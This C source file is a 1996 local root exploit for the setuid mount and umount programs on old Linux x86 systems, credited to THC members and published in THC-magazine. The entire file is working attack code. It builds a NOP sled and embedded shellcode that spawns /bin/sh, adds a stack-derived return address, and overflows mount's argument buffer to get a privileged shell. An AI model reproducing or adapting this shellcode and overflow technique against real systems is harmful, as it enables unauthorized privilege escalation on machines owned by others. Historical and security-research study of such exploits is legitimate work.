/*
 * mount exploit for linux x86 < 2.0.10
 * discovered by bloodmask&vio/couin
 * coded by plasmoid/thc/deep for thc-magazine issue #3
 * 12/12/96 - works also on umount 
 */

#include <stdio.h>

#define lv_size  1024
#define offset     30+lv_size+8*4

long get_sp()
{
    __asm__("movl %esp, %eax");
}

void main(int argc, char **argv)
{
    char execshell[] =
	"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
	"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
	"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

    char buffer[lv_size + 4 * 8];
    unsigned long *ptr2 = NULL;
    char *ptr = NULL;
    int i;

    for (i = 0; i < lv_size + 4 * 8; i++)
	buffer[i] = 0x00;

    ptr = buffer;
    for (i = 0; i < lv_size - strlen(execshell); i++)
	*(ptr++) = 0x90;

    for (i = 0; i < strlen(execshell); i++)
	*(ptr++) = execshell[i];

    ptr2 = (long *) ptr;
    for (i = 1; i < 2; i++)
	*(ptr2++) = get_sp() + offset;

    printf("discovered by bloodmask&vio/couin\n"
	   "coded by plasmoid/thc/deep\n" "for thc-magazine issue #3\n");

    (void) alarm((int) 0);
    execl("/bin/mount", "mount", buffer, NULL);
}
